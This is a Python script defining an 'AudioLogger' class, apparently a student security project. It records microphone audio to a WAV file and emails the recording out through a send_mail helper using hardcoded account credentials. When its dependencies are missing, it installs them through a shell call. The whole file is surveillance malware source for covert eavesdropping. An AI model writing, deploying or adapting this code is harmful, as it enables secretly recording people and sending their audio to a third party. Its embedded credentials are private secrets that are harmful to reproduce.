try: #import necessary libraries
    import threading
    import sounddevice as sd 
    from scipy.io.wavfile import write
    from mail import send_mail #Send Log to Mail
except ModuleNotFoundError:
    from subprocess import call
    modules = ["sounddevice","scipy"]
    call("pip install " + ' '.join(modules), shell=True)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    SEND_REPORT_EVERY = 30 
    FILENAME = "C:/Users/sudee/ISAA/AudioOutput.wav"
    TYPE = "Audiologging Data"

    class AudioLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "AudioLogger Started..."
            self.email = email
            self.password = password

        def save_audio(self):
            fs = 44100  
            seconds = 5  

            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait() 
            write(FILENAME, fs, myrecording)
            send_mail(self.email, self.password, FILENAME, TYPE)

        def report(self):
            self.save_audio()
            #timer = threading.Timer(self.interval, self.report)
            #timer.start()

        def run(self):
            self.report()

    